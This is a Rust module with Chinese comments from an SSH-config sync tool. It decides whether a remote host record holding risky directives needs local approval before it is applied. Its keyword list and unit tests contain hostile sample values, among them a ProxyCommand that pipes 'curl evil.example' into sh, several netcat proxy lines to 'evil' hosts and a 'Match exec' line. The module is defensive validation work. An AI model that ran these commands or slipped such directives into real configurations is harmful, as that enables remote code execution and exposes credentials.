//! 危險設定核准(spec §7.4):遠端記錄要套用的新文字若含受管制的設定,就以「核准簽章」與本機目前已套用的區塊
//! 比較,不同就保留不套用、等使用者核准。keyword 一律取 config 解析器解析出的 directive(大小寫、`Keyword=value`
//! 寫法已處理),不以文字搜尋判斷。純函式,不碰 I/O。

use serde::{Deserialize, Serialize};

use crate::config::model::{Directive, Item};
use crate::config::parser::parse_file;
use crate::sync::hosts_file::is_single_host_block_read_alike;

/// 受管制的設定(小寫 keyword;前十個是 spec §7.4 原本的,其餘十四個是審查後加入的,每一個都用 `ssh -G` 確認 OpenSSH
/// 10.3p1 認得、設了就生效):遠端記錄新增或改動它們,要先經本機核准。分五類:
/// - 執行本機程式或載入本機程式庫:`ProxyCommand`、`LocalCommand`、`PermitLocalCommand`、`KnownHostsCommand`、
///   `PKCS11Provider`、`SecurityKeyProvider`、`SmartcardDevice`(`PKCS11Provider` 的別名)、`XAuthLocation`(指定 xauth 程式的路徑)。
/// - 把本機的憑證、環境變數或網路開放給遠端:`ForwardAgent`、`ForwardX11`、`ForwardX11Trusted`、`RemoteForward`、`SendEnv`
///   (本機的環境變數送給伺服器)、`GSSAPIDelegateCredentials`(把 Kerberos 憑證委派給伺服器)、`IdentityAgent`(指定 ssh 與
///   哪一個 agent 溝通)、`PermitRemoteOpen`(`RemoteForward` 當 SOCKS 代理時,允許連到哪些目的地)。
/// - 在伺服器上以使用者的身分執行指令:`RemoteCommand`。它不需要轉向,連的就是你原本要連的那台,所以不會碰到主機金鑰的確認。
/// - 關掉讓「轉向」可以安全的主機金鑰確認:`StrictHostKeyChecking`、`NoHostAuthenticationForProxyCommand`、
///   `NoHostAuthenticationForLocalhost`(連到 loopback 時不檢查主機金鑰:配上一個轉到 loopback 的 `LocalForward` 或
///   `ProxyJump`,ssh 就不經提示連到別的伺服器)、`VerifyHostKeyDNS`、`UserKnownHostsFile`、`GlobalKnownHostsFile`。spec §3 說
///   `HostName` 等只是轉向、ssh 仍會跳出主機金鑰提示,這句話要這些設定沒被動過才成立。
/// - 把轉送的連接埠開放給區網:`GatewayPorts`(沒寫綁定位址的 `LocalForward`、`DynamicForward` 改綁到所有介面)。
///
/// `HostName`、`User`、`Port`、`ProxyJump` 等刻意不在其中(spec §3);`LocalForward`、`DynamicForward` 只有寫成「只有埠號」的
/// 平常形狀才不受管制,其他寫法都受管制(`gated_forward`)。`HostName`、`User`、`HostKeyAlias`、`ProxyJump` 的「值」會被 ssh
/// 展開進指令,由 `hosts_file::forbidden_directive` 另外擋。
pub const GATED_KEYWORDS: [&str; 24] = [
    "proxycommand",
    "localcommand",
    "permitlocalcommand",
    "knownhostscommand",
    "pkcs11provider",
    "securitykeyprovider",
    "forwardagent",
    "forwardx11",
    "forwardx11trusted",
    "remoteforward",
    "smartcarddevice",
    "xauthlocation",
    "remotecommand",
    "stricthostkeychecking",
    "nohostauthenticationforproxycommand",
    "verifyhostkeydns",
    "userknownhostsfile",
    "globalknownhostsfile",
    "sendenv",
    "gssapidelegatecredentials",
    "identityagent",
    "permitremoteopen",
    "nohostauthenticationforlocalhost",
    "gatewayports",
];

/// 一行受管制的設定。
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../src/bindings/"))]
pub struct GatedDirective {
    /// keyword 小寫,例如 `proxycommand`。
    pub keyword: String,
    /// keyword 之後的整段文字(含解析器當成行尾註解的部分),去頭尾空白。
    pub value: String,
}

/// 核准簽章(spec §7.4):兩份文字的簽章相同,代表受管制的設定與它們適用的主機範圍都沒變。
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../src/bindings/"))]
pub struct ApprovalSignature {
    /// `Host` 那一行 keyword 之後的整段文字,去頭尾空白:所有 pattern 依原順序,連同行尾註解。
    pub host: String,
    /// 受管制的 directive,依出現順序。
    pub gated: Vec<GatedDirective>,
}

/// keyword 之後的整段文字,去頭尾空白。解析器把第一個不在雙引號裡的 `#` 之後當成行尾註解,OpenSSH 卻不是:
/// `ProxyCommand`/`LocalCommand`/`KnownHostsCommand` 的整段文字原樣交給 shell(`true x#$(…)` 的 `$(…)` 會執行),
/// `Host` 的 pattern 只有在 token 開頭的 `#` 才是註解(`Host safe#x` 是一個 pattern)。所以簽章取整段文字。
fn rest_of_line(d: &Directive) -> String {
    format!("{}{}{}", d.value, d.trailing_ws, d.inline_comment.as_deref().unwrap_or(""))
        .trim()
        .to_string()
}

/// 受管制:keyword 在清單上;不是「只有埠號」那種平常形狀的 `LocalForward`、`DynamicForward`(`gated_forward`);
/// 或看不出真正的 keyword —— 一律當成受管制:
/// - keyword 帶雙引號:OpenSSH 會去掉引號照樣生效(`"ProxyCommand" …`),解析器的 keyword 卻帶著引號。
/// - keyword 是空字串:那一行(縮排之後)以 `=` 開頭。OpenSSH 會略過這個 `=`、把下一個詞當成 keyword
///   (`=ProxyCommand nc evil 22` 照常生效),解析器卻把真正的 keyword 藏進 value、自己的 keyword 是空的。
///
/// 同步的記錄本來就會被 `hosts_file::validate_host_text` 拒絕這兩種寫法,這裡是第二道防線。
///
/// 「生效」的判斷和序列化器完全一致(`Directive::serializes_as_comment`):只有寫出來是註解的 directive 才不算。
/// 光看 `enabled` 不夠 —— 序列化器只在 `!enabled && dirty` 時才寫成註解,沒有 dirty 的 directive 照 `raw` 原樣寫出,
/// 在磁碟上仍是生效的一行。
fn is_gated(d: &Directive) -> bool {
    !d.serializes_as_comment()
        && (GATED_KEYWORDS.contains(&d.key.as_str())
            || gated_forward(d)
            || d.keyword.contains('"')
            || d.key.is_empty())
}

/// 受管制的 `LocalForward`、`DynamicForward`:除了下面兩種「只有埠號」的平常形狀,一律要核准。只有埠號時 OpenSSH 沒有綁定
/// 位址,依 `GatewayPorts`(受管制)綁在 loopback;其他寫法都可能讓它綁在明確的位址(`*`、空位址、非 loopback 位址會把轉送的
/// 連接埠開放給區網)或 socket 上,逐一判斷位址不如一律要核准可靠。
/// - `LocalForward`:恰好兩個參數,第一個是純數字的埠號,第二個是 `主機:埠號` 或絕對路徑的 socket(`is_plain_forward_target`)。
///   只看第一個參數不夠:OpenSSH 把兩個參數接成 `第一個:第二個` 再整串以 `:` 切欄位(`readconf.c` 的 `fwdarg`、
///   `parse_forward`),四個欄位時第一欄就是綁定位址 —— `LocalForward 0 8080:host:80` 和 `LocalForward 0.0.0.0:8080 host:80`
///   一樣綁在所有介面(OpenSSH 10.3p1 `ssh -G` 印出 `localforward [0]:8080 [host]:80`;`0 [8080]:host:80`、
///   `3232235777 8080:host:80`、`0 8080:/tmp/x.sock` 同理)。
/// - `DynamicForward`:恰好一個參數,而且是純數字的埠號。
///
/// 參數照 OpenSSH 的斷詞(空格、tab 分詞,詞首的 `#` 起算註解);帶引號、跳脫或 `$` 的參數不算平常形狀,一律受管制。
fn gated_forward(d: &Directive) -> bool {
    let rest = rest_of_line(d);
    let args: Vec<&str> = rest.split([' ', '\t']).filter(|word| !word.is_empty()).take_while(|word| !word.starts_with('#')).collect();
    match d.key.as_str() {
        "localforward" => !matches!(args.as_slice(), [port, target] if is_bare_port(port) && is_plain_forward_target(target)),
        "dynamicforward" => !matches!(args.as_slice(), [port] if is_bare_port(port)),
        _ => false,
    }
}

/// 純數字的埠號(`08080` 也算;超出範圍的 ssh 自己會拒絕整份設定)。
fn is_bare_port(word: &str) -> bool {
    !word.is_empty() && word.bytes().all(|b| b.is_ascii_digit())
}

/// `LocalForward` 第二個參數的平常寫法:`主機:埠號`(主機不含 `:`,或是中括號包起來的 IPv6 `[…]`;埠號是純數字)或絕對路徑
/// 的 socket(不含 `:`)。這兩種接在純數字的第一個參數後面,OpenSSH 切出來的都是「沒有綁定位址」的形狀。含 `$`(OpenSSH 先展開
/// 環境變數才切欄位,`LocalForward 0 ${X}` 在 `X=8080:host:80` 時綁在所有介面)、反斜線(跳脫會改變切法)或引號的都不算。
fn is_plain_forward_target(target: &str) -> bool {
    if target.contains(['$', '\\', '"', '\'']) {
        return false;
    }
    if target.starts_with('/') {
        return !target.contains(':');
    }
    let (host, port) = match target.strip_prefix('[') {
        Some(bracketed) => match bracketed.split_once("]:") {
            Some(parts) => parts,
            None => return false,
        },
        None => match target.split_once(':') {
            Some(parts) => parts,
            None => return false,
        },
    };
    !host.is_empty() && !host.contains(['[', ']']) && is_bare_port(port)
}

fn collect(items: &[Item], hosts: &mut Vec<String>, gated: &mut Vec<GatedDirective>) {
    for item in items {
        match item {
            Item::Directive(d) if is_gated(d) => gated.push(GatedDirective { keyword: d.key.clone(), value: rest_of_line(d) }),
            Item::Host(h) => {
                hosts.push(rest_of_line(&h.header));
                collect(&h.body, hosts, gated);
            }
            Item::Match(m) => collect(&m.body, hosts, gated),
            Item::Directive(_) | Item::Blank(_) | Item::Comment(_) => {}
        }
    }
}

/// 一筆 host 記錄文字的簽章。簽章只描述「恰好一個 Host 區塊」:區塊外的全域指令、`Match` 的條件、多個區塊之間的歸屬
/// (受管制的那一行屬於哪個 `Host`)都不在裡面 —— 其他形狀的文字拿到的簽章不完整,不能拿來比較,
/// `needs_approval` 對它們一律回 true。
pub fn signature(text: &str) -> ApprovalSignature {
    let (items, _) = parse_file(text);
    let mut hosts = Vec::new();
    let mut gated = Vec::new();
    collect(&items, &mut hosts, &mut gated);
    ApprovalSignature { host: hosts.join("\n"), gated }
}

/// 文字恰好是一個 Host 區塊、沒有別的東西 —— 和 `hosts_file::validate_host_text` 對記錄文字的要求一樣:沒有全域指令、
/// 沒有 `Match`、沒有區塊外的註解或空行。區塊「裡面」的註解與空行是區塊的一部分,不算。`Host` 那一行 OpenSSH 讀到的
/// pattern 也必須和解析器的相同(`hosts_file::is_single_host_block_read_alike`):`Host web#x *` 對解析器是 `web`,
/// 對 OpenSSH 卻是 `web#x` 與 `*`,簽章的 pattern 看不出它其實套用到每一台主機。
fn is_single_host_block(text: &str) -> bool {
    is_single_host_block_read_alike(&parse_file(text).0)
}

/// 遠端的新文字要不要先經本機核准(spec §7.4)。新文字不含任何受管制的設定 → false(含「移除受管制的設定」);
/// 否則與目前已套用的本機區塊比較簽章,不同 → true。本機沒有這台主機(`applied_text` = None)→ 空簽章。
/// 所以擴大適用範圍(`Host safe` → `Host safe prod`)、調整同名指令的先後、新增或修改受管制的值都要重新核准。
///
/// 失敗就關(fail closed):新文字、以及已套用的文字(有的話)只要不是「恰好一個 Host 區塊」(含 `Host` 那一行 OpenSSH
/// 讀到的 pattern 與解析器不同,見 `is_single_host_block`),就直接回 true,不比較也不看有沒有受管制的設定 —— 簽章對其他
/// 形狀的文字是不完整的(見 `signature`),而且 `Match exec` 這類東西本身就會執行本機程式。
/// 正常的呼叫端傳進來的一定是單一區塊(遠端的文字已通過 `validate_host_text`,本機的區塊來自 `blocks_of`),所以這條只擋意外。
pub fn needs_approval(new_text: &str, applied_text: Option<&str>) -> bool {
    if !is_single_host_block(new_text) || applied_text.is_some_and(|text| !is_single_host_block(text)) {
        return true;
    }
    let incoming = signature(new_text);
    if incoming.gated.is_empty() {
        return false;
    }
    let applied = applied_text.map(signature).unwrap_or_default();
    incoming != applied
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::serialize::serialize_items;

    const APPLIED: &str = "Host web\n  HostName 10.0.0.1\n  ProxyCommand nc %h 22\n  ForwardAgent yes\n";

    #[test]
    fn text_without_gated_settings_never_needs_approval() {
        let plain = "Host web\n  HostName 10.9.9.9\n  User root\n  Port 2222\n  ProxyJump bastion\n  LocalForward 8080 localhost:80\n  DynamicForward 1080\n";
        assert!(!needs_approval(plain, None));
        assert!(!needs_approval(plain, Some("Host web\n")));
        assert!(signature(plain).gated.is_empty());
    }

    #[test]
    fn a_new_gated_setting_needs_approval() {
        assert!(needs_approval(APPLIED, None), "a host this device does not have yet");
        assert!(needs_approval(APPLIED, Some("Host web\n  HostName 10.0.0.1\n")));
    }

    #[test]
    fn other_changes_next_to_unchanged_gated_settings_apply_directly() {
        let edited = "Host web\n  HostName 10.0.0.2\n  User deploy\n  ProxyCommand nc %h 22\n  # a note\n  ForwardAgent yes\n";
        assert!(!needs_approval(edited, Some(APPLIED)));
    }

    #[test]
    fn widening_or_reordering_the_host_patterns_needs_approval() {
        let applied = "Host safe\n  ForwardAgent yes\n";
        assert!(needs_approval("Host safe prod\n  ForwardAgent yes\n", Some(applied)));
        assert!(needs_approval("Host prod safe\n  ForwardAgent yes\n", Some("Host safe prod\n  ForwardAgent yes\n")));
        // OpenSSH 把 `safe#x` 當成一個 pattern:簽章取整行,改成 `safe` 也要重新核准。
        assert!(needs_approval("Host safe\n  ForwardAgent yes\n", Some("Host safe#x\n  ForwardAgent yes\n")));
    }

    #[test]
    fn reordering_gated_directives_needs_approval() {
        let a = "Host web\n  RemoteForward 9000 localhost:9000\n  RemoteForward 9001 localhost:9001\n";
        let b = "Host web\n  RemoteForward 9001 localhost:9001\n  RemoteForward 9000 localhost:9000\n";
        assert!(needs_approval(b, Some(a)));
        let swapped = "Host web\n  HostName 10.0.0.1\n  ForwardAgent yes\n  ProxyCommand nc %h 22\n";
        assert!(needs_approval(swapped, Some(APPLIED)));
    }

    #[test]
    fn keyword_case_and_equals_syntax_neither_hide_nor_fake_a_change() {
        let applied = "Host web\n  ProxyCommand nc %h 22\n";
        assert!(!needs_approval("Host web\n  PROXYCOMMAND = nc %h 22\n", Some(applied)));
        assert!(!needs_approval("Host web\n  proxycommand=nc %h 22\n", Some(applied)));
        assert!(needs_approval("Host web\n  proxyCommand=nc evil.example 22\n", Some(applied)));
    }

    #[test]
    fn removing_gated_settings_applies_directly() {
        assert!(!needs_approval("Host web\n  HostName 10.0.0.1\n", Some(APPLIED)));
    }

    #[test]
    fn a_changed_comment_on_a_gated_line_needs_approval() {
        // 解析器當成註解的 `#…`,shell 看得到:`x#$(…)` 會執行 `$(…)`。
        let applied = "Host web\n  ProxyCommand /usr/bin/true x#y\n";
        assert!(needs_approval("Host web\n  ProxyCommand /usr/bin/true x#$(curl evil.example|sh)\n", Some(applied)));
    }

    #[test]
    fn commented_out_settings_are_not_gated() {
        assert!(!needs_approval("Host web\n  # ProxyCommand nc evil.example 22\n", None));
    }

    #[test]
    fn every_listed_keyword_is_gated_and_quoted_keywords_are_too() {
        for keyword in GATED_KEYWORDS {
            let text = format!("Host web\n  {keyword} x\n");
            assert_eq!(signature(&text).gated.len(), 1, "{keyword}");
        }
        assert!(needs_approval("Host web\n  \"ProxyCommand\" nc evil.example 22\n", None));
    }

    #[test]
    fn the_signature_keeps_the_whole_host_line_and_the_gated_lines_in_order() {
        let sig = signature("Host web prod # both\n  User a\n  ForwardAgent yes # needed\n  RemoteForward 9000 localhost:9000\n");
        assert_eq!(
            sig,
            ApprovalSignature {
                host: "web prod # both".to_string(),
                gated: vec![
                    GatedDirective { keyword: "forwardagent".into(), value: "yes # needed".into() },
                    GatedDirective { keyword: "remoteforward".into(), value: "9000 localhost:9000".into() },
                ],
            }
        );
        assert_eq!(signature(""), ApprovalSignature::default());
    }

    #[test]
    fn a_leading_equals_line_is_gated_even_though_the_parser_sees_no_keyword() {
        // OpenSSH 會略過行首的 `=`、把下一個詞當成 keyword,`=ProxyCommand nc evil 22` 照常生效;解析器卻給出空
        // keyword,真正的 keyword 藏在 value 裡。簽章把空 keyword 當成受管制,連同藏起來的 keyword 整段記下來。
        let text = "Host web\n  =ProxyCommand nc evil 22\n";
        assert!(needs_approval(text, None));
        assert_eq!(
            signature(text).gated,
            vec![GatedDirective { keyword: String::new(), value: "ProxyCommand nc evil 22".into() }]
        );
        assert!(needs_approval("Host web\n  = ProxyCommand nc evil 22\n", None));
        // 同一行沒變就不必重新核准;值改了,或改寫成一般寫法(簽章不同),都要重新核准。
        assert!(!needs_approval(text, Some(text)));
        assert!(needs_approval("Host web\n  =ProxyCommand nc other 22\n", Some(text)));
        assert!(needs_approval(text, Some("Host web\n  ProxyCommand nc evil 22\n")));
    }

    /// 解析 `Host web` 加一行 ProxyCommand,把那一行的 `enabled` / `dirty` 設成指定值,回傳整份項目。
    fn proxycommand_items(enabled: bool, dirty: bool) -> Vec<Item> {
        let (mut items, _) = parse_file("Host web\n  ProxyCommand nc evil 22\n");
        let Item::Host(host) = &mut items[0] else { panic!("expected a Host block") };
        let Item::Directive(d) = &mut host.body[0] else { panic!("expected the ProxyCommand line") };
        d.enabled = enabled;
        d.dirty = dirty;
        items
    }

    fn gated_in(items: &[Item]) -> Vec<GatedDirective> {
        let (mut hosts, mut gated) = (Vec::new(), Vec::new());
        collect(items, &mut hosts, &mut gated);
        gated
    }

    #[test]
    fn a_disabled_directive_is_gated_unless_it_is_written_out_as_a_comment() {
        // 序列化器只在 `!enabled && dirty` 時把一行寫成註解;沒有 dirty 的 directive 一律照 `raw` 原樣寫出,
        // 不管 `enabled` 是什麼。所以「停用但沒有 dirty」的 ProxyCommand 在磁碟上仍是生效的一行,簽章必須算它。
        let clean = proxycommand_items(false, false);
        assert_eq!(serialize_items(&clean, true), "Host web\n  ProxyCommand nc evil 22\n");
        assert_eq!(gated_in(&clean).len(), 1);

        // `enabled = false` 又 dirty:寫成 `# ProxyCommand …`,不生效,不算。
        let commented = proxycommand_items(false, true);
        assert_eq!(serialize_items(&commented, true), "Host web\n  # ProxyCommand nc evil 22\n");
        assert!(gated_in(&commented).is_empty());

        // 啟用的 directive:dirty 與否都算。
        assert_eq!(gated_in(&proxycommand_items(true, false)).len(), 1);
        assert_eq!(gated_in(&proxycommand_items(true, true)).len(), 1);
    }

    /// 受管制的 keyword,照 ssh_config(5) 的拼法、依 `GATED_KEYWORDS` 的順序(前十個是 spec §7.4 原本的,其餘十四個是
    /// 審查後加入的;每一個都用 `ssh -G` 確認 OpenSSH 10.3p1 認得、設了就生效)。
    const GATED_SPELLINGS: [&str; 24] = [
        "ProxyCommand",
        "LocalCommand",
        "PermitLocalCommand",
        "KnownHostsCommand",
        "PKCS11Provider",
        "SecurityKeyProvider",
        "ForwardAgent",
        "ForwardX11",
        "ForwardX11Trusted",
        "RemoteForward",
        "SmartcardDevice",
        "XAuthLocation",
        "RemoteCommand",
        "StrictHostKeyChecking",
        "NoHostAuthenticationForProxyCommand",
        "VerifyHostKeyDNS",
        "UserKnownHostsFile",
        "GlobalKnownHostsFile",
        "SendEnv",
        "GSSAPIDelegateCredentials",
        "IdentityAgent",
        "PermitRemoteOpen",
        "NoHostAuthenticationForLocalhost",
        "GatewayPorts",
    ];

    #[test]
    fn the_gated_keywords_are_gated_in_their_documented_spelling() {
        // `every_listed_keyword_is_gated_and_quoted_keywords_are_too` 只走訪 `GATED_KEYWORDS` 自己,清單少一項或拼錯一個字
        // 它發現不了。這裡照 ssh_config(5) 的拼法逐一檢查,並釘住清單的內容與順序(B4 前端有一份副本,測試依序比對)。
        // 先比 Vec 再逐一檢查:清單長度若不是 24,失敗訊息會指出是哪一項不一樣。
        let listed: Vec<&str> = GATED_KEYWORDS.to_vec();
        let expected: Vec<String> = GATED_SPELLINGS.iter().map(|s| s.to_lowercase()).collect();
        assert_eq!(listed, expected, "GATED_KEYWORDS, in order");
        for keyword in GATED_SPELLINGS {
            assert!(needs_approval(&format!("Host web\n  {keyword} x\n"), None), "{keyword}");
        }
    }

    #[test]
    fn forwards_with_an_explicit_bind_address_or_a_socket_are_gated() {
        // `ssh -G` 實測(OpenSSH 10.3p1):`*:8080` 讀成 `[*]:8080`、`:8080` 讀成 `[]:8080`(兩者都綁所有介面)、
        // `0.0.0.0:8080`、`localhost:8080`、`[::1]:8080` 與 socket 路徑都是綁定位址;`"*:8080"` 去掉引號後同 `*:8080`;
        // `http` 是服務名稱(埠號 80)。第一個參數不是純數字就一律要核准。
        // 第一個參數是純數字也不夠:OpenSSH 把兩個參數接成 `第一個:第二個` 再切欄位,四個欄位時第一欄就是綁定位址 ——
        // `0 8080:host:80` 印出 `localforward [0]:8080 [host]:80`(綁在所有介面),`0 [8080]:host:80`、
        // `3232235777 8080:host:80`(= 192.168.1.1)、`0 8080:/tmp/x.sock` 同理;`$` 先展開環境變數才切欄位。
        for line in [
            "LocalForward 0 8080:host:80",
            "LocalForward 0 [8080]:host:80",
            "LocalForward 3232235777 8080:host:80",
            "LocalForward 0 8080:/tmp/x.sock",
            "LocalForward 0 ${FORWARD}",
            "LocalForward 8080 ${HOST}:80",
            "LocalForward 8080 h\\:x:80",
            "LocalForward 8080 \"host:80\"",
            "LocalForward 8080 host:80 extra",
            "LocalForward 8080 host",
            "LocalForward 8080",
            "LocalForward 8080 host:http",
            "LocalForward 8080 [::1:80",
            "DynamicForward 1080 extra",
            "DynamicForward 0 1080",
            "LocalForward *:8080 host:80",
            "LocalForward :8080 host:80",
            "LocalForward 0.0.0.0:8080 host:80",
            "LocalForward localhost:8080 host:80",
            "LocalForward [::1]:8080 host:80",
            "LocalForward /tmp/forward.sock host:80",
            "LocalForward \"*:8080\" host:80",
            "LocalForward http host:80",
            "localforward=*:8080 host:80",
            "LocalForward # nothing",
            "DynamicForward *:1080",
            "DynamicForward 0.0.0.0:1080",
            "DynamicForward localhost:1080",
            "DynamicForward [::1]:1080",
            "DYNAMICFORWARD :1080",
        ] {
            let text = format!("Host web\n  {line}\n");
            assert!(needs_approval(&text, None), "{line}");
            assert_eq!(signature(&text).gated.len(), 1, "{line}");
        }
        // 只寫埠號:綁在 loopback(依受管制的 `GatewayPorts`),不受管制 —— 和 `HostName` 等一樣只是轉向。`ssh -G` 印出的
        // 監聽端都只有埠號:`localforward 8080 [host]:80`、`8080 [::1]:80`、`8080 /tmp/x.sock`、`dynamicforward 1080`。
        for line in [
            "LocalForward 8080 host:80",
            "LocalForward 8080 [::1]:80",
            "LocalForward 8080 /tmp/x.sock",
            "LocalForward 8080 web.example.com:22 # tunnel",
            "LocalForward=8080 host:80",
            "LocalForward 08080 host:80",
            "LocalForward 8080 /tmp/remote.sock",
            "DynamicForward 1080",
            "DynamicForward\t1080 # socks",
        ] {
            let text = format!("Host web\n  {line}\n");
            assert!(!needs_approval(&text, None), "{line}");
            assert!(signature(&text).gated.is_empty(), "{line}");
        }
        // 只寫埠號改成有綁定位址:要核准;已核准的同一行不必再核准。
        assert!(needs_approval("Host web\n  LocalForward *:8080 host:80\n", Some("Host web\n  LocalForward 8080 host:80\n")));
        let bound = "Host web\n  LocalForward localhost:8080 host:80\n";
        assert!(!needs_approval(bound, Some(bound)));
        assert_eq!(
            signature(bound).gated,
            vec![GatedDirective { keyword: "localforward".into(), value: "localhost:8080 host:80".into() }]
        );
    }

    #[test]
    fn smartcarddevice_is_gated_because_it_is_an_alias_of_pkcs11provider() {
        // `ssh -G` 把它印成 `pkcs11provider /usr/lib/libz.dylib`:同一個設定的另一個名字,一樣會載入本機程式庫。
        // 把 OpenSSH 10.3p1 執行檔裡長得像 keyword 的字串(448 個)逐一設定、對照這 22 個受管制設定,這是唯一的別名。
        let text = "Host web\n  SmartcardDevice /usr/lib/libz.dylib\n";
        assert!(needs_approval(text, None));
        assert_eq!(
            signature(text).gated,
            vec![GatedDirective { keyword: "smartcarddevice".into(), value: "/usr/lib/libz.dylib".into() }]
        );
        assert!(needs_approval("Host web\n  SmartcardDevice x\n", None));
    }

    #[test]
    fn a_host_line_that_openssh_reads_differently_needs_approval() {
        // `Host web#x *`:解析器(與簽章)只看到 `web`,OpenSSH 讀到 `web#x` 與 `*` —— 這個區塊其實套用到每一台主機。
        // 同步的記錄本來就會被 `validate_host_text` 拒絕;這裡是第二道防線:不比較簽章、一律要核准,沒有受管制的設定也一樣。
        let glued = "Host web#x *\n  HostName attacker.example.net\n  User root\n";
        assert!(needs_approval(glued, None));
        assert!(needs_approval(glued, Some(glued)), "not even against itself");
        assert!(needs_approval("Host web\n  HostName 10.0.0.1\n", Some("Host web#x *\n  HostName 10.0.0.1\n")));
        assert!(needs_approval("Host web\n  HostName 10.0.0.1\n", Some("Host \"web *\"\n  HostName 10.0.0.1\n")));
        // 真正的行尾註解(`#` 在詞的開頭)兩邊讀起來一樣,照常比較。
        assert!(!needs_approval("Host web # office\n  HostName 10.0.0.1\n", None));
        assert!(!needs_approval("Host web # office\n  ForwardAgent yes\n", Some("Host web # office\n  ForwardAgent yes\n")));
    }

    #[test]
    fn anything_but_exactly_one_host_block_needs_approval() {
        // 簽章只描述「一個 Host 區塊」:全域指令、Match 的條件、多個區塊之間的歸屬都不在裡面。所以其他形狀的文字不比較、
        // 一律要核准 —— 即使裡面沒有任何受管制的設定(`Match exec` 本身就會執行本機程式)。
        for text in [
            "Host web\nMatch exec \"touch /tmp/x\"\n",
            "Host web\n  HostName 10.0.0.1\nMatch host web\n  User deploy\n",
            "Host web\n  HostName 10.0.0.1\nMatch host web\n  ForwardAgent yes\n",
            "ProxyCommand nc evil 22\nHost web\n  HostName 10.0.0.1\n",
            "HostName 10.0.0.1\nHost web\n",
            "Host a\nHost b\n",
            "# note\nHost web\n  HostName 10.0.0.1\n",
            "",
        ] {
            assert!(needs_approval(text, None), "{text:?}");
            assert!(needs_approval(text, Some(text)), "{text:?} against itself");
        }
        // 受管制的那一行從一個 Host 區塊搬到另一個:簽章分不出來(兩份的簽章相同),所以不能靠比較簽章放行。
        let a = "Host a\n  ForwardAgent yes\nHost b\n";
        let b = "Host a\nHost b\n  ForwardAgent yes\n";
        assert_eq!(signature(a), signature(b), "the signature alone cannot tell these apart");
        assert!(needs_approval(b, Some(a)));
        // `signature` 本身對這些文字仍會列出看得到的受管制設定(只是不完整,所以不拿來比較)。
        assert_eq!(signature("Host web\nMatch all\n  ForwardAgent yes\n").gated.len(), 1);
        assert_eq!(signature("ForwardAgent yes\nHost web\n").gated.len(), 1);
        // 已套用的那份也要是單一 Host 區塊:乾淨的新文字配上形狀不對的已套用文字,同樣要核准。
        assert!(needs_approval("Host web\n  HostName 10.0.0.1\n", Some("Host web\nMatch all\n")));
        assert!(needs_approval("Host web\n  HostName 10.0.0.1\n", Some("")));
        // 區塊「裡面」的註解與空行是區塊的一部分,照常比較。
        assert!(!needs_approval("Host web\n  ForwardAgent yes\n\n# note\n", Some("Host web\n  ForwardAgent yes\n")));
        assert!(!needs_approval("Host web\n  HostName 10.0.0.1\n\n", None));
    }
}
